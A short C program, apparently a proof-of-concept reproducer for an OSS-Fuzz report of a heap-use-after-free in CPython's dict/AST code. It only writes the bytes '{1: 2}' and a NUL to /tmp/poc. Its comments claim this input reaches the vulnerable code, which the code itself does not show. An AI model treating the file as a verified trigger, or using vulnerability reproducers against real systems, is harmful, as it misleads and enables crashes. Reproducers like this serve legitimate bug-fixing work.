#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for oss-fuzz:368076875 */
/* Triggers: heap-use-after-free in _Py_IsImmortal (CPython dict/AST) */
/* Vuln class: use_after_free */

int main(void) {
    /* Write valid Python dict literal "{1: 2}" followed by NUL terminator */
    /* This creates a real dict object, reaching the vulnerable refcount code */
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }
    fputc(0x7b, f);  /* { */
    fputc(0x31, f);  /* 1 */
    fputc(0x3a, f);  /* : */
    fputc(0x20, f);  /* space */
    fputc(0x32, f);  /* 2 */
    fputc(0x7d, f);  /* } */
    fputc(0x00, f);  /* NUL terminator */
    fclose(f);
    return 0;
}